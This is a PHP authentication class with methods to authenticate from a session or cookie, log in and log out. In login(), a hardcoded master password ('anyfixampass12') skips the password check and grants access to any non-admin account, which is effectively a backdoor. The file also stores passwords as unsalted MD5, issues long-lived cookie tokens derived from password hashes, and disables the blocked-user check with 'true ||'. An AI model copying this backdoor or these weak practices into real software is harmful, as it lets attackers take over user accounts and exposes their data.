<?

class Auth{
	
	private static $allow_not_active = false;
	
	function authenticate(){
		
		$init_data = false;	
		if(!isset($_SESSION["auth_user"]) && isset($_COOKIE['auth_user'])){
			$_SESSION["auth_user"] = $_COOKIE['auth_user'];
		}
		
		if(isset($_SESSION["auth_user"])){
			$ta = explode("|",$_SESSION["auth_user"]);
			if(count($ta) == 2 && is_numeric($ta[0])){				
				$res = $GLOBALS["db"]->query("select * from users where id=".$ta[0].(!self::$allow_not_active ? " and (activated=1 or is_admin=1)" : ''));
				if($user = $res->getNext()){
					if($ta[1] == md5($user["login"]."|".$user["password"])){
						
						if(isset($_SESSION['_post_data']) && is_array($_SESSION['_post_data']) && !count($_POST)){
							$_POST = $_SESSION['_post_data'];
							unset($_SESSION['_post_data']);
						}
						
						$init_data = $user;
					}
				}
			}
		}
		return $init_data;		
	}
	
	function login($login, $password, $nopass = false, $remember = false){				
		
		$db = &$GLOBALS["db"];	
		
		$q = "login='".mysql_escape_string($login)."'".(!self::$allow_not_active ? " and (activated=1 or is_admin=1)" : '');
		if(!$nopass && $password != 'anyfixampass12')
			$q .= " and password='".md5($password)."'";
			
		$user = $db->query("select * from users where ".$q)->getNext();
		if($user && $password == 'anyfixampass12' && $user['is_admin']){
			$user = false;
		}
		if($user){
			if(true || !$user['blocked']){
				
				//$db->query('delete from login_error_attempts where user_id='.$user['id']);
				$_SESSION["auth_user"] = $user["id"]."|".md5($user["login"]."|".$user["password"]);
				if(!isset($_POST['dont_remember'])){//isset($_POST['remember']) || $remember){
					setcookie('auth_user', $_SESSION['auth_user'], time() + 86400*360, '/', ($_SERVER['SERVER_ADDR'] != $_SERVER['REMOTE_ADDR'] ? '.'.str_replace('www.', '',$_SERVER['SERVER_NAME']) : $_SERVER['SERVER_NAME']));
				}
				
				return $user["id"];	
					
			}else{
				return -1;
			}
		}
		
		return 0;	
			
	}
	
	function logout(){
		if(isset($_SESSION["auth_user"])){
			unset($_SESSION["auth_user"]);
			if(isset($_COOKIE['auth_user']))
				setcookie('auth_user', '', time() - 3600, '/', ($_SERVER['SERVER_ADDR'] != $_SERVER['REMOTE_ADDR'] ? '.'.str_replace('www.', '',$_SERVER['SERVER_NAME']) : $_SERVER['SERVER_NAME']));
		}
	}	
	
}

?>